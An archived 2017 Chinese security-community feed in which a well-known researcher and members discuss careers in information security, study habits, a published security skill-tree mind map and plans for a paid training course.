<img src="https://file.xiaomiquan.com/bd/87/bd872d6bf8f2e37a8687398bc1bc0af07f9b896fc43c3663a77f830db1ac4c5c.jpg" width="25px"/> __ken🐜__: 祝未来的弟妹们高考顺利

<img src="https://file.xiaomiquan.com/7b/a3/7ba3ce253869c2ec028be38020a72e36ab8ba9eec55537e6011348b75123917f.jpg" width="25px"/> __Deux__: 想想高考都过去十年了

<img src="https://file.xiaomiquan.com/97/e7/97e7f02be3bbd5c0edf8a8b2292a42b06825b4fe7eb564b848a86bcb9e515a20.jpg" width="25px"/> __yifan__: 💪

<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 1:43 一会就高考了我竟然还在看小密圈…

<img src="https://file.xiaomiquan.com/d4/f6/d4f664b0c403a9b1a5919d7e5aa4a31ba6d4548df5c0e9da17ed682204d8910d.jpg" width="25px"/> __召唤大蟒蛇的男性火系矮人法师__: 去年高考

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__ replies to <img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 点赞，高考就有意识学安全，感觉我浪费了好多青春！祝好成绩。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

一个被和谐又恢复了的回答：国内信息安全行业真的很有前途，职位空缺很大吗？

<img src="https://images.xiaomiquan.com/Fi1ZH9PXJwP9WqOf7O-eVa6m0zTd?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:xSE9ebmq__L5_agWHjEeyNEleEQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 这几年信息安全从边缘化到主流，到浮躁。

<img src="https://file.xiaomiquan.com/cd/f6/cdf616f3c3482ab88d82a504400e8de7f0beb76954a7ccdf4b2240ade40df4a8.jpg" width="25px"/> __Daxer__: 大大 你说了啥被和谐了😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/cd/f6/cdf616f3c3482ab88d82a504400e8de7f0beb76954a7ccdf4b2240ade40df4a8.jpg" width="25px"/> __Daxer__: 仅仅提了习大大...

<img src="https://file.xiaomiquan.com/cd/f6/cdf616f3c3482ab88d82a504400e8de7f0beb76954a7ccdf4b2240ade40df4a8.jpg" width="25px"/> __Daxer__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 贼溜🤣

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 武汉就由武大成立网络学院，直属网信办。

<img src="https://file.xiaomiquan.com/ba/7a/ba7a84cec143b8357d49ee72562aefcb4181e33187fa4883a573360308dd254f.jpg" width="25px"/> __来先生__: 漏洞盒子需要人


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

一个被和谐又恢复了的回答：国内信息安全行业真的很有前途，职位空缺很大吗？

<img src="https://images.xiaomiquan.com/Fi1ZH9PXJwP9WqOf7O-eVa6m0zTd?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:xSE9ebmq__L5_agWHjEeyNEleEQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 这几年信息安全从边缘化到主流，到浮躁。

<img src="https://file.xiaomiquan.com/cd/f6/cdf616f3c3482ab88d82a504400e8de7f0beb76954a7ccdf4b2240ade40df4a8.jpg" width="25px"/> __Daxer__: 大大 你说了啥被和谐了😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/cd/f6/cdf616f3c3482ab88d82a504400e8de7f0beb76954a7ccdf4b2240ade40df4a8.jpg" width="25px"/> __Daxer__: 仅仅提了习大大...

<img src="https://file.xiaomiquan.com/cd/f6/cdf616f3c3482ab88d82a504400e8de7f0beb76954a7ccdf4b2240ade40df4a8.jpg" width="25px"/> __Daxer__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 贼溜🤣

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 武汉就由武大成立网络学院，直属网信办。

<img src="https://file.xiaomiquan.com/ba/7a/ba7a84cec143b8357d49ee72562aefcb4181e33187fa4883a573360308dd254f.jpg" width="25px"/> __来先生__: 漏洞盒子需要人


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

关于安全技能学习的一点建议：“情报跟进”比如 Twitter 方式，还有不少其他方式，每天都会发现信息量过大，不要过度消耗在这些碎片信息上，知道有这个事就好了，除非是大事，比如一个超级漏洞/事件爆发，那优先级自然会提升到最高。

每天应该合理安排自己的时间，该认真工作就认真工作，业余时间该放松就合理放松，该熬夜就熬夜，年轻人可以多拼，也应该多拼，拼真正的技能沉淀，只有沉淀了这些技能才是你的。

到头来，形成的自己的核心竞争力就是有那么一两项拿手绝活，而不是好像什么都知道，但没一门是真正精通的。



...

<img src="https://file.xiaomiquan.com/13/70/137012a11284a7beb8a308ca8d88ceb37724ec6909e6f6d8fec32eb5863ebd80.jpg" width="25px"/> __星语__: 中肯

<img src="https://file.xiaomiquan.com/8d/f6/8df6a4c90a9ec9e3b7d237bdd5b1798141a4dd962c04c0534de4fbe048cd1bc4.jpg" width="25px"/> __Y叔也叫段子手__: 推荐下腾讯玄武实验室的每日安全动态推送


[腾讯玄武实验室安全动态推送(Tencent Xuanwu Lab Security Daily Ne...](https://xuanwulab.github.io/cn/secnews/2017/06/06/index.html)



<img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__: 精辟


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

安全技能树简版里的“高效习惯”，其中最后一个是“情报跟进”，里面提到了 Twitter，这个有同学疑问如何操作。

很简单啊，比如：你关注我的 Twitter: @evilcos，看看我关注了谁，都关注一遍不就是了？我关注的基本都是全球安全/黑客圈内挺牛的人。

顺着这个社交关系不断丰富自己的关注列表，你每天最不缺的就是全球安全情报了...

最后，建议英语一定要跟上，不懂的单词或短语，推荐“Google 翻译”，有 App，不被墙。



...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 已关注😌

<img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__: 请问有不被墙的上推特方式么

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__: ……翻墙是必备技能

<img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😂感觉自己的vps搭vpn总被封，有能推荐的稳定的免费或付费vpn么

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__: 没看我昨天发布的安全技能树？

<img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😂😂

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__: 花个一百块买个服务，轻松搞定

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: cos感觉英文专业词汇好难啊，英语感觉还得再学😁

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 现在正是好机会，慢慢沉淀吧

<img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 恩，弄得蓝灯，有点贵

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/30/7a/307a024aabc6d7aa455fd3ba57379f3e144d771bec2f66f117bde7f9ec786aca.jpg" width="25px"/> __乔木__: shadowsocks服务，很多


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-05:

> Sea0fStars 提问：
使用AppArmor或者SELinux加固系统，效果明显吗？然后，如何更好的加固Web服务器呢？


明显，其他可以参考安全技能树里防御那里的说明与资料。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-05:

> 匿名用户 提问：
余弦老师，自己对安全这块挺感兴趣的，但是不知道从哪方面开始入手，或者要先掌握哪些技术，怎么实战的去练习，有什么建议么，谢啦


此时你可以看我刚刚发布的安全技能树简版了，还有你还必须明确你到底感兴趣的是哪个或哪些安全分支。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-05:

> 匿名用户 提问：
为什么路由器里状态显示的外网IP和从网页查询的公网IP不一样


traceroute 下，你的路由器外面说不定还有个真正的外网路由器



...

<img src="https://file.xiaomiquan.com/b7/f5/b7f5c4ac2c8c032c26ba4fd222cebd77a07b4d0d3ee27ac28e2e3ae8907fc59f.jpg" width="25px"/> __兜兜有糖不给你吃__: Tracert的瘟逗死，traceroute的Linux


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-05:

> 匿名用户 提问：
余弦大哥你好，我是一名PHP程序员，我对渗透和网络安全有浓厚的兴趣，平时也有关注安全领悟的文章和挖掘漏洞（基本挖不倒），打算以后从业网络安全的工作但我觉得目前的工作水平还尚未提高，高不成低不就的。我现在是否只专注网络安全的技术，还是一边提升现在的工作和网络安全技术？


不要放弃自己的核心竞争力，PHP 强的话，做这方面漏洞审计会是你的优势。而且精通一门编程语言，对于挖其他语言的漏洞也是有好处的，很多思想的通的。

你看我发布的那个安全技能树简版，这些技能我们都是并行掌握，互相补充。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-05:

> ken🐜 提问：
我发现您提供的工具kalilinux里面都有是不是可以直接在kali里面使用而不用再搭建环境了


嗯，Kali 有的就直接使用，很方便。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-05:


__#公告#__

 
__#资源#__

 安全技能树简版 V1 正式发布

本来是想只出极简版本，想着不过瘾，就出了个简版，不那么复杂，但是内容也比较丰富了。

包括如下 10 大项内容：

说明
高效习惯
正则表达式
数据相关
从脚本到大并发
HTTP
各种协议
漏洞测试
渗透测试
防御

本圈的同学可以先睹为快！😏

线上版本：

[安全技能树简版](http://evilcos.me/security_skill_tree_basic/index.html)



图片版本：

[security_skill_tree_basic.png (PNG Image, 1998 × 2...](http://evilcos.me/security_skill_tree_basic/security_skill_tree_basic.png)



源文件：

[http://evilcos.me/security_skill_tree_basic/securi...](http://evilcos.me/security_skill_tree_basic/security_skill_tree_basic.xmind)



[http://evilcos.me/security_skill_tree_basic/securi...](http://evilcos.me/security_skill_tree_basic/security_skill_tree_basic.mm)



后续本圈的分享会围绕这份安全技能树进行逐一解读，如果你都能掌握好，这个网络世界，还有什么是大问题？

这份简版至少半年不会有大变化，快点跟上吧。



...

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 赞！对比了一下技能树，发现自己过去一年没有白费！
不过在安全方面，原来技能树上的例如XXS和SQLI的测试环境有没有必要补上？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 简版没必要，这里提供的几个漏洞环境其实已经很全面了

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 👌

<img src="https://file.xiaomiquan.com/67/3d/673d53bb43c2bd967a9e6a5f48a7110c99d1e74bf35d7151cd263e7aeb01048d.jpg" width="25px"/> __Lever__: 各个分叉可以并行着折腾吧？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/67/3d/673d53bb43c2bd967a9e6a5f48a7110c99d1e74bf35d7151cd263e7aeb01048d.jpg" width="25px"/> __Lever__: 可以

<img src="https://file.xiaomiquan.com/49/bb/49bb0c794122469d16ccfb5a2418c30f94caa307cd4f03c5e51b5a03873a06cb.jpg" width="25px"/> __王胖胖__: 正在学django ，下周是爬虫

<img src="https://file.xiaomiquan.com/d4/6b/d46b6a2cf6727f72a44077f6cfdc5ae9d8d6ef232cf7bb08b2dacf58f0ae5a5f.jpg" width="25px"/> __白玉箫__: 很多时候。。。少了"多"

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 全英文……自己跟5年够不够啊😌

<img src="https://file.xiaomiquan.com/c0/62/c062d1e1b8c2783abcbd7cbd6e3500efe2bc1b828807f8fd6fbc15d55fcb973a.jpg" width="25px"/> __方㕫昉眆__: 捉虫？
Burp Suite

[Burp Suite editions and features](https://portswigger.net/burp/)


很时候，免费版本已经满足需求

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c0/62/c062d1e1b8c2783abcbd7cbd6e3500efe2bc1b828807f8fd6fbc15d55fcb973a.jpg" width="25px"/> __方㕫昉眆__: 已修正👍

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/d4/6b/d46b6a2cf6727f72a44077f6cfdc5ae9d8d6ef232cf7bb08b2dacf58f0ae5a5f.jpg" width="25px"/> __白玉箫__: 已修正👍

<img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__: 期待更多解读，👍

<img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 请问，硬件方面的iphone +ipad+Mac，主要优势在哪方面

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 效率高、安全、快

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: mac默认可省鼠标一枚。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-04:


__#公告#__

  照顾恐慌者，明天会发布“安全技能树极简版”，敬请关注。😎



...

<img src="https://file.xiaomiquan.com/13/70/137012a11284a7beb8a308ca8d88ceb37724ec6909e6f6d8fec32eb5863ebd80.jpg" width="25px"/> __星语__: 树旁边可否对应的推荐一些资源👀

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 期待中

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 要是像猪猪侠的ppt那样，公布技能学习的资源就更赞了！

<img src="https://file.xiaomiquan.com/70/24/7024da54169114c4eb02cf2b02a240c57ec748c432139e0938190f463b5246fa.jpg" width="25px"/> __尘__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ppt能否给个链接，或传一份？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/70/24/7024da54169114c4eb02cf2b02a240c57ec748c432139e0938190f463b5246fa.jpg" width="25px"/> __尘__: 自己搜下吧，猪猪侠 我的白帽子之路，他微博上也有发

<img src="https://file.xiaomiquan.com/ec/c2/ecc227ca054c7c4a655a2bbd1a676cf38a149b7ef75f7cf351194cbf24b13a27.jpg" width="25px"/> __Ivy__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 并不能找到唉，他的微博叫什么啊

<img src="https://file.xiaomiquan.com/bc/3e/bc3e9334466421eb3f5da3a4f084783617f870995fd3677f152b20e9ce5b1348.jpg" width="25px"/> __远松__ replies to <img src="https://file.xiaomiquan.com/ec/c2/ecc227ca054c7c4a655a2bbd1a676cf38a149b7ef75f7cf351194cbf24b13a27.jpg" width="25px"/> __Ivy__: ringzero  文件是叫“我的白帽学习路线”

<img src="https://file.xiaomiquan.com/bc/3e/bc3e9334466421eb3f5da3a4f084783617f870995fd3677f152b20e9ce5b1348.jpg" width="25px"/> __远松__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 刚看了猪猪侠的ppt，强调的是基础知识，刚好和cos的安全技能树互补👍


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-04:

> 匿名用户 提问：
在freebuf上看到了赛克网络安全夏令营，今年举办到了第三届。
[第三届赛客360网络安全夏令营报名正式开始 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/fevents/136211.html)

 想问问这个夏令营这么样，郑州的综合训练营值得去吗？


第一届我去做过一次分享，氛围感觉挺不错的。后来也听了一些同学反馈收获不错。这个也不是你想去就能去的，估计现在他们审核更严了吧。毕竟都到了第三届。

如果觉得自己时间安排得出来，那可以一试。



...

<img src="https://file.xiaomiquan.com/15/73/1573e3d1dbeb1675b2c1f5cb471cbf81849258d6513431bd4bccbb3b2d718b1d.jpg" width="25px"/> __s1eep__: 在郑州我竟然没听过赛克，看来是我孤陋寡闻了

<img src="https://file.xiaomiquan.com/5c/af/5caf79f247fa06bb995524b2c816b0fbdb198ab47460a90c538a29f76fde0dee.jpg" width="25px"/> __？__: 毕业3年，人在成都上班，想参加这一类培训真的心有余而力不足。如果在成都办就太好了。


...

---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-03:


__#公告#__

  如果有些问题超过一天我们没回答的，可能是我们觉得这类问题不适合公开讨论或过于泛或已经回答过类似的或超出我们能力范围。那么，大家可以私信问我们。

私信给我、余弦都行，我们会尽量互动，希望对你有帮助。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-03:

> 匿名用户 提问：
快点组织真实的线下培训，自我造血
靠情怀和个人魅力无法养活公司

希望给小密圈的朋友们尽快一个计划

现在安全培训其实可选的很多，各有招牌

以上意见!


谢提醒，我们有自己的计划，放心。现在先后已经在给几家公司、单位做针对性的安全培训（入门到进阶到高端都有），我们到他们的场地里去，效果很直接。如果有这方面需求的圈友，可以私信我细聊。

只是现在我们还没自己组织过线下场地，然后招募学员，也没在线上组织过培训。

我们看到 i春秋 昨晚发了个这个：

i春秋Web安全工程师线下培训开班啦！

[i春秋Web安全工程师线下培训开班啦！](http://mp.weixin.qq.com/s/8lljXBoRiqobi-_j7VhDVg)



如果着急参加这类线下培训的同学，不妨看看，不用等我们。

但是，我们也不想辜负圈友们的期待，无论是这种线下培训，还是线上培训。我们争取暑期第一个月可以办一场吧。

目前一级大纲目录如下：

Web 前端 0day 挖掘与利用
Web 0day 挖掘与利用
IoT 设备(SOHO 路由器) 0day 挖掘与利用
如何征服这个网络空间
黑客手机定制与利用
Python 黑客入门到进阶
JavaScript 黑客入门到进阶
Linux 黑客入门到进阶
渗透测试入门到进阶
内网渗透入门到进阶
研发过程安全入门到进阶
企业如何有效对抗攻击者



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个目录里的内容我们历史上都做过培训，有不少素材沉淀。但这些细分领域可能差异很大，如果我们办这种线下培训或线上培训，肯定只能挑选其中一个方向进行。

<img src="https://file.xiaomiquan.com/e4/65/e465e874c8d9bef8b99fcf786f37aa0ba55202b26b7cf835e5c2e7965b36b621.jpg" width="25px"/> __Evoker__: 如果是线下的话，希望线上也能有偿发布线下视频....感觉线下可能赶不上了

<img src="https://file.xiaomiquan.com/13/70/137012a11284a7beb8a308ca8d88ceb37724ec6909e6f6d8fec32eb5863ebd80.jpg" width="25px"/> __星语__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 线上其实也可以用i春秋的模式，看一段视频后给你丢一个虚拟机操作😜

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/13/70/137012a11284a7beb8a308ca8d88ceb37724ec6909e6f6d8fec32eb5863ebd80.jpg" width="25px"/> __星语__: 嗯，挺不错的

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 安全高手搞培训是不是浪费了，从未来看，新东方啥的一介入，从宣传到服务肯定更到位。如果没做大的话从收益看自己做项目应该收益更高，所以安全高手搞个小密圈，聚集些水平相当，价值观基本相同的人，一起做点项目的事更有未来……

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 哦当然培训还是要搞，聚集人才，人才带来信息，带来项目

<img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: 其实创建这个小密圈已经是在培训了， 如果那些想手把手教的，  你能成长到什么程度？ 自我学习能力呢？

<img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: 如果学习每一样东西，都要靠着别人录的视频？ 如果没有呢？是否不打算自己研究下去了，我说的再严重点是不是懒？   我不鄙视初学者，但是想想以前的前辈，那个时代有像现在资源这么丰富么？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: 观点真酷。😎

<img src="https://file.xiaomiquan.com/d2/18/d218f1e1f6265c71a5b8590ca5f47d80f81ca4d5998c8fc968e01ad974e43fb0.jpg" width="25px"/> __trav__ replies to <img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: 要攀爬技术巅峰一定是自己实践才上得去，但是如果有人指导就能更顺利的上山，避免走一些弯路呀，因为山下的丛林太多了😁

<img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__ replies to <img src="https://file.xiaomiquan.com/d2/18/d218f1e1f6265c71a5b8590ca5f47d80f81ca4d5998c8fc968e01ad974e43fb0.jpg" width="25px"/> __trav__: 有些弯路对自己有好处的，那也是必不可少的修炼，才能更懂得。

<img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 线上还可以的吧。

